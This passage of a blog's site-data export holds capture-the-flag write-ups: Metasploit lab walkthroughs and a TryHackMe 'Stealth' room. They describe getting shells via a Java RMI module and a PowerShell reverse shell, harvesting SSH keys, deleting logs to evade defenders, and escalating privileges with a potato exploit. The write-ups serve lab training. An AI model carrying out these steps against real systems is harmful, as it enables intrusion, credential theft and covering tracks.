flag.\n\n![](https://i.imgur.com/vsZZTmU.png)\n\n![](https://i.imgur.com/7rV9TRB.png)\n![](https://i.imgur.com/BDHEMIo.png)\n\n","source":"_posts/metasploit-ctf/metasploit-1.md","raw":"---\ntitle: \"MSF CTF\"\ndate: 2023-09-15T11:30:03+00:00\n# weight: 1\n# aliases: [\"/first\"]\ntags: [\"Metasploit-ctf\"]\n# author: [\"Me\", \"You\"] # multiple authors\nshowToc: true\ntop_img: /images/cyberpunk-red.jpg\nTocOpen: false\ndraft: false\nhidemeta: false\ncomments: false\ndescription: \"Metasploit ctf series\"\nhideSummary: false\nsearchHidden: false\nShowReadingTime: true\nShowBreadCrumbs: true\nShowPostNavLinks: true\nShowWordCount: false\nShowRssButtonInSectionTermList: true\nUseHugoToc: true\n---\n# Metasploit ctf I (*easy*)\n\n### CTF Scenario:\n\n- This lab is dedicated to you! No other users are on this network :)\n- Once you start the lab, you will have access to a Kali terminal based instance. This machine has an interface with IP address 192.X.Y.Z.\n- The lab has two target machines which should be located on the same subnet  i.e. 192.X.Y.0/24\n- The target systems most of times, belong to \"admin\" or \"root\" user.\n- Do not attack the gateway located at IP address 192.X.Y.1\n- You can use all tools installed in Kali to complete this lab.\n\n## Flags:\n\n- This lab has only 1 Flag to be collected.\n- The Flag can be identified either by the strings flag, flagX, FLAG, FLAGX.\n- The Flag can either be a normal string or a 32-character random Hex string.\n## Recon \nchecking our network interfaces, with `ip a s` this is a command used to display info about the network interfaces on the system.\n\n![](https://i.imgur.com/Q3nW1a4.png)\n\nHaving identified our target `target-1`, & `target-2` , our aim is to exploit the two boxes, so running an nmap scan we see `target-1` is running `rmiregistry` on port 1909 and `target-2` is running ssh.\n\n![](https://i.imgur.com/Vzu6BCd.png)\n\nWhat is ***rmiregistry***? it's a tool in Java used for Remote Method Invocation to manage and look up remote objects on a network,*RMI* in java allows objects in one Java Virtual Machine to invoke methods on objects residing in another JVM, another remote machine. \nThis provides a way for Java applications to communicate and interact across a network.[https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/index.html](read more)\n\n## metasploit \nsince it's a metasploit ctf we need to check out for some exploit. \n\nWe find a module that take advantage of the deault configuration of the RMI registry and RMI Activation services, which allow loading classes from any remote (HTTP) URL. \n\nAs it invokes a method in the RMI Distributed Garbage Collector which is available via every RMI endpoint, it can be used against both rmiregistry and rmid, and against most other (custom) RMI endpoints as well. Note that it does not work against Java Management Extension (JMX) ports since those do not support remote class loading, unless another RMI endpoint is active in the same Java process. \n\nRMI method calls do not support or  require any sort of authentication.\n\n## exploit \nSo, loading up everything on metasploit, running the module we get a shell back\n\n![](https://i.imgur.com/Le8fCAn.png)\n\nstabilizing our shell we go to the home directory under the folder alice there is some ssh keys that we can use and login with since we are already root.\n\n![](https://i.imgur.com/LUcKnZZ.png)\n\nso, having known where the ssh keys are we can background our sessions and use the ssh_creds metasploit module.\n\n## flag.\nthe ssh_creds metasploit module, it will collect the contents of all users' .ssh directories on the targeted machine.\n\n![](https://i.imgur.com/Feds9zY.png)\n\nAfter which we can use the ssh_login module to login into the machine *target-2*, we are using the login_pubkey cause of the public key we got on the alice folder.\n\n![](https://i.imgur.com/8bo6jEO.png)\n\n**N|B** \n\nI set the rhost to the machine that we are targeting *target-2* which is the ip with the *.4*.\n\nChecking our sessions we see that we have a new session created and we got the flag.\n\n![](https://i.imgur.com/vsZZTmU.png)\n\n![](https://i.imgur.com/7rV9TRB.png)\n![](https://i.imgur.com/BDHEMIo.png)\n\n","slug":"metasploit-ctf/metasploit-1","published":1,"updated":"2024-07-16T20:39:15.773Z","_id":"clyouz1j4000bwgjn7h8q1e1x","layout":"post","photos":[],"content":"<h1 id=\"Metasploit-ctf-I-easy\"><a href=\"#Metasploit-ctf-I-easy\" class=\"headerlink\" title=\"Metasploit ctf I (easy)\"></a>Metasploit ctf I (<em>easy</em>)</h1><h3 id=\"CTF-Scenario\"><a href=\"#CTF-Scenario\" class=\"headerlink\" title=\"CTF Scenario:\"></a>CTF Scenario:</h3><ul>\n<li>This lab is dedicated to you! No other users are on this network :)</li>\n<li>Once you start the lab, you will have access to a Kali terminal based instance. This machine has an interface with IP address 192.X.Y.Z.</li>\n<li>The lab has two target machines which should be located on the same subnet  i.e. 192.X.Y.0&#x2F;24</li>\n<li>The target systems most of times, belong to “admin” or “root” user.</li>\n<li>Do not attack the gateway located at IP address 192.X.Y.1</li>\n<li>You can use all tools installed in Kali to complete this lab.</li>\n</ul>\n<h2 id=\"Flags\"><a href=\"#Flags\" class=\"headerlink\" title=\"Flags:\"></a>Flags:</h2><ul>\n<li>This lab has only 1 Flag to be collected.</li>\n<li>The Flag can be identified either by the strings flag, flagX, FLAG, FLAGX.</li>\n<li>The Flag can either be a normal string or a 32-character random Hex string.</li>\n</ul>\n<h2 id=\"Recon\"><a href=\"#Recon\" class=\"headerlink\" title=\"Recon\"></a>Recon</h2><p>checking our network interfaces, with <code>ip a s</code> this is a command used to display info about the network interfaces on the system.</p>\n<p><img src=\"https://i.imgur.com/Q3nW1a4.png\"></p>\n<p>Having identified our target <code>target-1</code>, &amp; <code>target-2</code> , our aim is to exploit the two boxes, so running an nmap scan we see <code>target-1</code> is running <code>rmiregistry</code> on port 1909 and <code>target-2</code> is running ssh.</p>\n<p><img src=\"https://i.imgur.com/Vzu6BCd.png\"></p>\n<p>What is <em><strong>rmiregistry</strong></em>? it’s a tool in Java used for Remote Method Invocation to manage and look up remote objects on a network,<em>RMI</em> in java allows objects in one Java Virtual Machine to invoke methods on objects residing in another JVM, another remote machine.<br>This provides a way for Java applications to communicate and interact across a network.[<a href=\"https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/index.html]\">https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/index.html]</a>(read more)</p>\n<h2 id=\"metasploit\"><a href=\"#metasploit\" class=\"headerlink\" title=\"metasploit\"></a>metasploit</h2><p>since it’s a metasploit ctf we need to check out for some exploit. </p>\n<p>We find a module that take advantage of the deault configuration of the RMI registry and RMI Activation services, which allow loading classes from any remote (HTTP) URL. </p>\n<p>As it invokes a method in the RMI Distributed Garbage Collector which is available via every RMI endpoint, it can be used against both rmiregistry and rmid, and against most other (custom) RMI endpoints as well. Note that it does not work against Java Management Extension (JMX) ports since those do not support remote class loading, unless another RMI endpoint is active in the same Java process. </p>\n<p>RMI method calls do not support or  require any sort of authentication.</p>\n<h2 id=\"exploit\"><a href=\"#exploit\" class=\"headerlink\" title=\"exploit\"></a>exploit</h2><p>So, loading up everything on metasploit, running the module we get a shell back</p>\n<p><img src=\"https://i.imgur.com/Le8fCAn.png\"></p>\n<p>stabilizing our shell we go to the home directory under the folder alice there is some ssh keys that we can use and login with since we are already root.</p>\n<p><img src=\"https://i.imgur.com/LUcKnZZ.png\"></p>\n<p>so, having known where the ssh keys are we can background our sessions and use the ssh_creds metasploit module.</p>\n<h2 id=\"flag\"><a href=\"#flag\" class=\"headerlink\" title=\"flag.\"></a>flag.</h2><p>the ssh_creds metasploit module, it will collect the contents of all users’ .ssh directories on the targeted machine.</p>\n<p><img src=\"https://i.imgur.com/Feds9zY.png\"></p>\n<p>After which we can use the ssh_login module to login into the machine <em>target-2</em>, we are using the login_pubkey cause of the public key we got on the alice folder.</p>\n<p><img src=\"https://i.imgur.com/8bo6jEO.png\"></p>\n<p><strong>N|B</strong> </p>\n<p>I set the rhost to the machine that we are targeting <em>target-2</em> which is the ip with the <em>.4</em>.</p>\n<p>Checking our sessions we see that we have a new session created and we got the flag.</p>\n<p><img src=\"https://i.imgur.com/vsZZTmU.png\"></p>\n<p><img src=\"https://i.imgur.com/7rV9TRB.png\"><br><img src=\"https://i.imgur.com/BDHEMIo.png\"></p>\n","cover":false,"excerpt":"","more":"<h1 id=\"Metasploit-ctf-I-easy\"><a href=\"#Metasploit-ctf-I-easy\" class=\"headerlink\" title=\"Metasploit ctf I (easy)\"></a>Metasploit ctf I (<em>easy</em>)</h1><h3 id=\"CTF-Scenario\"><a href=\"#CTF-Scenario\" class=\"headerlink\" title=\"CTF Scenario:\"></a>CTF Scenario:</h3><ul>\n<li>This lab is dedicated to you! No other users are on this network :)</li>\n<li>Once you start the lab, you will have access to a Kali terminal based instance. This machine has an interface with IP address 192.X.Y.Z.</li>\n<li>The lab has two target machines which should be located on the same subnet  i.e. 192.X.Y.0&#x2F;24</li>\n<li>The target systems most of times, belong to “admin” or “root” user.</li>\n<li>Do not attack the gateway located at IP address 192.X.Y.1</li>\n<li>You can use all tools installed in Kali to complete this lab.</li>\n</ul>\n<h2 id=\"Flags\"><a href=\"#Flags\" class=\"headerlink\" title=\"Flags:\"></a>Flags:</h2><ul>\n<li>This lab has only 1 Flag to be collected.</li>\n<li>The Flag can be identified either by the strings flag, flagX, FLAG, FLAGX.</li>\n<li>The Flag can either be a normal string or a 32-character random Hex string.</li>\n</ul>\n<h2 id=\"Recon\"><a href=\"#Recon\" class=\"headerlink\" title=\"Recon\"></a>Recon</h2><p>checking our network interfaces, with <code>ip a s</code> this is a command used to display info about the network interfaces on the system.</p>\n<p><img src=\"https://i.imgur.com/Q3nW1a4.png\"></p>\n<p>Having identified our target <code>target-1</code>, &amp; <code>target-2</code> , our aim is to exploit the two boxes, so running an nmap scan we see <code>target-1</code> is running <code>rmiregistry</code> on port 1909 and <code>target-2</code> is running ssh.</p>\n<p><img src=\"https://i.imgur.com/Vzu6BCd.png\"></p>\n<p>What is <em><strong>rmiregistry</strong></em>? it’s a tool in Java used for Remote Method Invocation to manage and look up remote objects on a network,<em>RMI</em> in java allows objects in one Java Virtual Machine to invoke methods on objects residing in another JVM, another remote machine.<br>This provides a way for Java applications to communicate and interact across a network.[<a href=\"https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/index.html]\">https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/index.html]</a>(read more)</p>\n<h2 id=\"metasploit\"><a href=\"#metasploit\" class=\"headerlink\" title=\"metasploit\"></a>metasploit</h2><p>since it’s a metasploit ctf we need to check out for some exploit. </p>\n<p>We find a module that take advantage of the deault configuration of the RMI registry and RMI Activation services, which allow loading classes from any remote (HTTP) URL. </p>\n<p>As it invokes a method in the RMI Distributed Garbage Collector which is available via every RMI endpoint, it can be used against both rmiregistry and rmid, and against most other (custom) RMI endpoints as well. Note that it does not work against Java Management Extension (JMX) ports since those do not support remote class loading, unless another RMI endpoint is active in the same Java process. </p>\n<p>RMI method calls do not support or  require any sort of authentication.</p>\n<h2 id=\"exploit\"><a href=\"#exploit\" class=\"headerlink\" title=\"exploit\"></a>exploit</h2><p>So, loading up everything on metasploit, running the module we get a shell back</p>\n<p><img src=\"https://i.imgur.com/Le8fCAn.png\"></p>\n<p>stabilizing our shell we go to the home directory under the folder alice there is some ssh keys that we can use and login with since we are already root.</p>\n<p><img src=\"https://i.imgur.com/LUcKnZZ.png\"></p>\n<p>so, having known where the ssh keys are we can background our sessions and use the ssh_creds metasploit module.</p>\n<h2 id=\"flag\"><a href=\"#flag\" class=\"headerlink\" title=\"flag.\"></a>flag.</h2><p>the ssh_creds metasploit module, it will collect the contents of all users’ .ssh directories on the targeted machine.</p>\n<p><img src=\"https://i.imgur.com/Feds9zY.png\"></p>\n<p>After which we can use the ssh_login module to login into the machine <em>target-2</em>, we are using the login_pubkey cause of the public key we got on the alice folder.</p>\n<p><img src=\"https://i.imgur.com/8bo6jEO.png\"></p>\n<p><strong>N|B</strong> </p>\n<p>I set the rhost to the machine that we are targeting <em>target-2</em> which is the ip with the <em>.4</em>.</p>\n<p>Checking our sessions we see that we have a new session created and we got the flag.</p>\n<p><img src=\"https://i.imgur.com/vsZZTmU.png\"></p>\n<p><img src=\"https://i.imgur.com/7rV9TRB.png\"><br><img src=\"https://i.imgur.com/BDHEMIo.png\"></p>\n"},{"title":"MSF CTF II","date":"2023-10-04T21:00:00.000Z","draft":false,"description":"Metasploit ctf series two","top_img":"/images/cyberpunk-red.jpg","_content":"\n## CTF Scenario.\n\n- This lab is dedicated to you! No other users are on this network\n- Once you start the lab, you will have access to a Kali terminal based instance. This machine has an interface with IP address 192.X.Y.Z.\n- The lab has two target machines which should be located on the same subnet  i.e. 192.X.Y.0/24\n- The target systems most of times, belong to \"admin\" or \"root\" user.\n\n# Flags.\n\n- This lab has only 1 Flag to be collected.\n- The Flag can be identified either by the strings flag, flagX, FLAG, FLAGX.\n\n## Recon\n\nGet the IP for the target we need to compromise, the run some nmap on them.\n![](https://i.imgur.com/Oi76QKA.png)\n![](https://i.imgur.com/831j10q.png)\n\n## Target 1\n\nChecking off the scan from `target-1` we can see it's running an outdated version of Werkzeug, a utility library for Python that provides tools and libraries for building web applications hence vulnerable to remote code execution. \n\nHoping on metasploit we find the module that can exploit the outdated version.\n![](https://i.imgur.com/dBobIFE.png)\n\nTo be continued ......","source":"_posts/metasploit-ctf/metasploit-2.md","raw":"---\ntitle: \"MSF CTF II\"\ndate: 2023-10-05\ndraft: false\ntags: [\"Metasploit-ctf\"]\ndescription: \"Metasploit ctf series two\"\ntop_img: /images/cyberpunk-red.jpg\n---\n\n## CTF Scenario.\n\n- This lab is dedicated to you! No other users are on this network\n- Once you start the lab, you will have access to a Kali terminal based instance. This machine has an interface with IP address 192.X.Y.Z.\n- The lab has two target machines which should be located on the same subnet  i.e. 192.X.Y.0/24\n- The target systems most of times, belong to \"admin\" or \"root\" user.\n\n# Flags.\n\n- This lab has only 1 Flag to be collected.\n- The Flag can be identified either by the strings flag, flagX, FLAG, FLAGX.\n\n## Recon\n\nGet the IP for the target we need to compromise, the run some nmap on them.\n![](https://i.imgur.com/Oi76QKA.png)\n![](https://i.imgur.com/831j10q.png)\n\n## Target 1\n\nChecking off the scan from `target-1` we can see it's running an outdated version of Werkzeug, a utility library for Python that provides tools and libraries for building web applications hence vulnerable to remote code execution. \n\nHoping on metasploit we find the module that can exploit the outdated version.\n![](https://i.imgur.com/dBobIFE.png)\n\nTo be continued ......","slug":"metasploit-ctf/metasploit-2","published":1,"updated":"2024-07-16T20:39:21.741Z","_id":"clyouz1j7000dwgjn5l6b4ju3","comments":1,"layout":"post","photos":[],"content":"<h2 id=\"CTF-Scenario\"><a href=\"#CTF-Scenario\" class=\"headerlink\" title=\"CTF Scenario.\"></a>CTF Scenario.</h2><ul>\n<li>This lab is dedicated to you! No other users are on this network</li>\n<li>Once you start the lab, you will have access to a Kali terminal based instance. This machine has an interface with IP address 192.X.Y.Z.</li>\n<li>The lab has two target machines which should be located on the same subnet  i.e. 192.X.Y.0&#x2F;24</li>\n<li>The target systems most of times, belong to “admin” or “root” user.</li>\n</ul>\n<h1 id=\"Flags\"><a href=\"#Flags\" class=\"headerlink\" title=\"Flags.\"></a>Flags.</h1><ul>\n<li>This lab has only 1 Flag to be collected.</li>\n<li>The Flag can be identified either by the strings flag, flagX, FLAG, FLAGX.</li>\n</ul>\n<h2 id=\"Recon\"><a href=\"#Recon\" class=\"headerlink\" title=\"Recon\"></a>Recon</h2><p>Get the IP for the target we need to compromise, the run some nmap on them.<br><img src=\"https://i.imgur.com/Oi76QKA.png\"><br><img src=\"https://i.imgur.com/831j10q.png\"></p>\n<h2 id=\"Target-1\"><a href=\"#Target-1\" class=\"headerlink\" title=\"Target 1\"></a>Target 1</h2><p>Checking off the scan from <code>target-1</code> we can see it’s running an outdated version of Werkzeug, a utility library for Python that provides tools and libraries for building web applications hence vulnerable to remote code execution. </p>\n<p>Hoping on metasploit we find the module that can exploit the outdated version.<br><img src=\"https://i.imgur.com/dBobIFE.png\"></p>\n<p>To be continued ……</p>\n","cover":false,"excerpt":"","more":"<h2 id=\"CTF-Scenario\"><a href=\"#CTF-Scenario\" class=\"headerlink\" title=\"CTF Scenario.\"></a>CTF Scenario.</h2><ul>\n<li>This lab is dedicated to you! No other users are on this network</li>\n<li>Once you start the lab, you will have access to a Kali terminal based instance. This machine has an interface with IP address 192.X.Y.Z.</li>\n<li>The lab has two target machines which should be located on the same subnet  i.e. 192.X.Y.0&#x2F;24</li>\n<li>The target systems most of times, belong to “admin” or “root” user.</li>\n</ul>\n<h1 id=\"Flags\"><a href=\"#Flags\" class=\"headerlink\" title=\"Flags.\"></a>Flags.</h1><ul>\n<li>This lab has only 1 Flag to be collected.</li>\n<li>The Flag can be identified either by the strings flag, flagX, FLAG, FLAGX.</li>\n</ul>\n<h2 id=\"Recon\"><a href=\"#Recon\" class=\"headerlink\" title=\"Recon\"></a>Recon</h2><p>Get the IP for the target we need to compromise, the run some nmap on them.<br><img src=\"https://i.imgur.com/Oi76QKA.png\"><br><img src=\"https://i.imgur.com/831j10q.png\"></p>\n<h2 id=\"Target-1\"><a href=\"#Target-1\" class=\"headerlink\" title=\"Target 1\"></a>Target 1</h2><p>Checking off the scan from <code>target-1</code> we can see it’s running an outdated version of Werkzeug, a utility library for Python that provides tools and libraries for building web applications hence vulnerable to remote code execution. </p>\n<p>Hoping on metasploit we find the module that can exploit the outdated version.<br><img src=\"https://i.imgur.com/dBobIFE.png\"></p>\n<p>To be continued ……</p>\n"},{"title":"stealth","date":"2023-11-29T08:30:03.000Z","draft":false,"description":"Stealth Tryhackme Room","top_img":"/images/cyberpunk-red.jpg","_content":"\n![](https://i.imgur.com/gd7lkVU.png)\n[stealth tryhackmeroom](https://tryhackme.com/room/stealth)\n\n## nmap scans\n\n```bash\nPORT      STATE SERVICE       REASON  VERSION\n139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds? syn-ack\n3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services\n|_ssl-date: 2023-11-30T18:28:49+00:00; -1s from scanner time.\n| rdp-ntlm-info: \n|   Target_Name: HOSTEVASION\n|   NetBIOS_Domain_Name: HOSTEVASION\n|   NetBIOS_Computer_Name: HOSTEVASION\n|   DNS_Domain_Name: HostEvasion\n|   DNS_Computer_Name: HostEvasion\n|   Product_Version: 10.0.17763\n|_  System_Time: 2023-11-30T18:28:10+00:00\n| ssl-cert: Subject: commonName=HostEvasion\n| Issuer: commonName=HostEvasion\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2023-07-28T19:06:15\n| Not valid after:  2024-01-27T19:06:15\n| MD5:   110c:1c21:e230:b7c7:41f5:4b6a:bf2b:9e6a\n| SHA-1: 34ad:3702:1a0a:2054:88a9:ea0c:820b:da64:b1bd:fb56\n| -----BEGIN CERTIFICATE-----\n| MIIC2jCCAcKgAwIBAgIQMIOcafxeh79B5cu+rs/taDANBgkqhkiG9w0BAQsFADAW\n| MRQwEgYDVQQDEwtIb3N0RXZhc2lvbjAeFw0yMzA3MjgxOTA2MTVaFw0yNDAxMjcx\n| OTA2MTVaMBYxFDASBgNVBAMTC0hvc3RFdmFzaW9uMIIBIjANBgkqhkiG9w0BAQEF\n| AAOCAQ8AMIIBCgKCAQEA2tUyXSZT7x2YueFMia0tU6xweBIvbwEXw0MBCXtHEf9A\n| LqZ6aiwNSsiLeW/kfBsqw6LArZNajuGggR2uj2HLGMn9Yx2RjnMSUaVWlJnB+j7s\n| YsgeVOr3Y8rFv0EPD2M6tKEZ7Zh8HoaBifHR3qeNIx+n6YcYmSjb0mUQ5kQso7SS\n| L7a9Beya4aynWgHXegaCVP0CcA750BRf1Ax+tjpojoTJOarC0C1QibbDs0s6NbUY\n| Z1CakxCRQlENDRau+vqqhRMxlbEfayl1YICTfMe6j3hMnVeYiPjZECt2nSe92i2p\n| rnzpdZ4Xbe8tdDzGETQGkBdOCOKPk6/nh80ifpcjBQIDAQABoyQwIjATBgNVHSUE\n| DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBABB4\n| HKrRnIrik9ef1F3Ah6r4FsdpCmZ0vXLNixsqm8IY81fNcRTogc/WFytU9gylcxRk\n| LhoUqXwtQhKqMFOKcEh3Kq2+VMUvgxTxvDywFS4S02AlhWtafq8NBm5nfxxubuit\n| tRO3fvdQ7mKS2hWvapW9+guEt0zJZI3Ai/C4NIq5WpbLEGSJe6DHUwXaPyFiHNYy\n| 5j91hKUWbDnIy4TqiIPjhBjYhrTvi46fbGbqMpHelUGABzJ5LFfGjORMOWA1bRPz\n| wuaEP62Dimr42pzbLPIgGTmBwpIXlpKdcydbJnVORxY4AfpLV6ypt2EPYS2TpKbz\n| 4Fw5A8aWrShuerOI7mc=\n|_-----END CERTIFICATE-----\n5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n8000/tcp  open  http          syn-ack PHP cli server 5.5 or later\n|_http-title: 404 Not Found\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n8080/tcp  open  http          syn-ack Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)\n| http-open-proxy: Potentially OPEN proxy.\n|_Methods supported:CONNECTION\n|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28\n|_http-title: PowerShell Script Analyser\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n8443/tcp  open  ssl/http      syn-ack Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)\n|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=localhost\n| Issuer: commonName=localhost\n| Public Key type: rsa\n| Public Key bits: 1024\n| Signature Algorithm: sha1WithRSAEncryption\n| Not valid before: 2009-11-10T23:48:47\n| Not valid after:  2019-11-08T23:48:47\n| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0\n| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6\n| -----BEGIN CERTIFICATE-----\n| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls\n| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD\n| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj\n| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o\n| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT\n| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD\n| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd\n| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL\n| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=\n|_-----END CERTIFICATE-----\n|_http-title: PowerShell Script Analyser\n| tls-alpn: \n|_  http/1.1\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc         syn-ack Microsoft Windows RPC\n49665/tcp open  msrpc         syn-ack Microsoft Windows RPC\n49666/tcp open  msrpc         syn-ack Microsoft Windows RPC\n49667/tcp open  msrpc         syn-ack Microsoft Windows RPC\n49668/tcp open  msrpc         syn-ack Microsoft Windows RPC\n49669/tcp open  msrpc         syn-ack Microsoft Windows RPC\n49670/tcp open  msrpc         syn-ack Microsoft Windows RPC\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 0s, deviation: 0s, median: -1s\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n| p2p-conficker: \n|   Checking for Conficker.C or higher...\n|   Check 1 (port 52662/tcp): CLEAN (Timeout)\n|   Check 2 (port 33712/tcp): CLEAN (Timeout)\n|   Check 3 (port 30307/udp): CLEAN (Timeout)\n|   Check 4 (port 41933/udp): CLEAN (Timeout)\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\n| smb2-time: \n|   date: 2023-11-30T18:28:10\n|_  start_date: N/A\n\n\n```\n## checking the site\n\n![](https://i.imgur.com/uV5DpSl.png)\n\nChecking the site out as described on tryhackme we are presented a site.\n\n![](https://i.imgur.com/JWMZg47.png)\n\nSo on the site we are only allowed to upload powershell scripts, we need to upload a script which will give us a reverse sehll to connect to the machine.\n\n## initial foothold\nGenerating a reverse shell with [revshells](http://revshells.com) and uploading it on the website we get a connection back. \n\n*Disclaimer*\n\nAfter uploading the script and using netcat as your listener you'll get a shell connection back but without the terminal instant which is *'funny'* to work with. \n![](https://i.imgur.com/FQKIuhp.png)\n\n\nA better shell instance that i got was from this guy [malw0re](https://github.com/malw0re/scriptures-). So after uploading we get a clean looking shell back. Searching the folders we land on the Desktop folder and there is a file called *encodedflag*.\n\nDecoding and reading the file we get some interesting message.\n\n![](https://i.imgur.com/kNofE1s.png)\n\nFollowing the decoded message and checking it out on the webpage we get an interesting message.\n![](https://i.imgur.com/JqHJOnC.png)\n\n## user level flag.\n\nChecking the documents file there is a directory called tasks inside it there's a file called log.txt and from the webpage response we need to remove the log file not to alert the blue team, removing the log file and reloading the webpage we get nothing so got stuck for a while.\nThen reading the *file.ps1* we see there is a directory hosting xampp\n\n![](https://i.imgur.com/ZaomI08.png)\n\nUnder the uploads directory, we identify the a log file removing it and refreshing the page we get the first flag.\n\n![](https://i.imgur.com/6C9PKha.png)\n\n![](https://i.imgur.com/o4vn183.png)\n\n## root level flag.\n\nHaving the user flag we need to look out for privesc vectors on the box and since it's a windows box i uploaded a powershell script that looks for some vectors.\n\n![](https://i.imgur.com/q5dzts3.png)\n\nThe command is downloading the (win-priv-check.ps1) from my attacker ip address using using the Invoke-WebRequest cmdlet and saving it locally as win.ps1. Running the script it identifies apache is running as admin.\n\n![](https://i.imgur.com/OifDB01.png)\n\nLet's check evader's privileges and check if we can abuse any privileges.\n\n![](https://i.imgur.com/a72wbxc.png)\n\nso we don't have any specific privilege that we can abuse so my next step was to upload a malicious php script to the webserver using pownyshell.\n\nchecking the privileges we see it's different from the output we go previously.\n\n![](https://i.imgur.com/A9Yszsw.png)\n\nAs we can see we can abuse the *\"SetImpersonatePrivilege\"* any process holding this privilege can impersonate (but not create) any token for which it is able to gethandle. You can get a privileged token from a Windows service (DCOM) making it perform an NTLM authentication against the exploit, then execute a process as SYSTEM [referenced from here.](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)\n\nSo our privesc vector are all relate to a potato exploit and after trying and failing i landed on the *\"efspotato\"* exploit which worked and elevate our privileges to NT SYSTEM!!\n\n![](https://i.imgur.com/F5WGaj8.png)\n\nTrying to get the admin flag we are face with some errors.\n\n![](https://i.imgur.com/wDnF2Xy.png)\n\nSo the next step was creating a user with admin privileges then rdp into the machine and get the machine.\n\n![](https://i.imgur.com/U29uu8P.png)\n\nLogin into the machine with the created user and get the flag\n\n![](https://i.imgur.com/jlALEK2.png)\n\nHope you learnt something new ✨","source":"_posts/tryhackme/stealth.md","raw":"---\ntitle: \"stealth\"\ndate: 2023-11-29T11:30:03+00:00\ndraft: false\ntags: [\"tryhackme\"]\ndescription: \"Stealth Tryhackme Room\"\ntop_img: /images/cyberpunk-red.jpg\n---\n\n![](https://i.imgur.com/gd7lkVU.png)\n[stealth tryhackmeroom](https://tryhackme.com/room/stealth)\n\n## nmap scans\n\n```bash\nPORT      STATE SERVICE       REASON  VERSION\n139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds? syn-ack\n3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services\n|_ssl-date: 2023-11-30T18:28:49+00:00; -1s from scanner time.\n| rdp-ntlm-info: \n|   Target_Name: HOSTEVASION\n|   NetBIOS_Domain_Name: HOSTEVASION\n|   NetBIOS_Computer_Name: HOSTEVASION\n|   DNS_Domain_Name: HostEvasion\n|   DNS_Computer_Name: HostEvasion\n|   Product_Version: 10.0.17763\n|_  System_Time: 2023-11-30T18:28:10+00:00\n| ssl-cert: Subject: commonName=HostEvasion\n| Issuer: commonName=HostEvasion\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2023-07-28T19:06:15\n| Not valid after:  2024-01-27T19:06:15\n| MD5:   110c:1c21:e230:b7c7:41f5:4b6a:bf2b:9e6a\n| SHA-1: 34ad:3702:1a0a:2054:88a9:ea0c:820b:da64:b1bd:fb56\n| -----BEGIN CERTIFICATE-----\n| MIIC2jCCAcKgAwIBAgIQMIOcafxeh79B5cu+rs/taDANBgkqhkiG9w0BAQsFADAW\n| MRQwEgYDVQQDEwtIb3N0RXZhc2lvbjAeFw0yMzA3MjgxOTA2MTVaFw0yNDAxMjcx\n| OTA2MTVaMBYxFDASBgNVBAMTC0hvc3RFdmFzaW9uMIIBIjANBgkqhkiG9w0BAQEF\n| AAOCAQ8AMIIBCgKCAQEA2tUyXSZT7x2YueFMia0tU6xweBIvbwEXw0MBCXtHEf9A\n| LqZ6aiwNSsiLeW/kfBsqw6LArZNajuGggR2uj2HLGMn9Yx2RjnMSUaVWlJnB+j7s\n| YsgeVOr3Y8rFv0EPD2M6tKEZ7Zh8HoaBifHR3qeNIx+n6YcYmSjb0mUQ5kQso7SS\n| 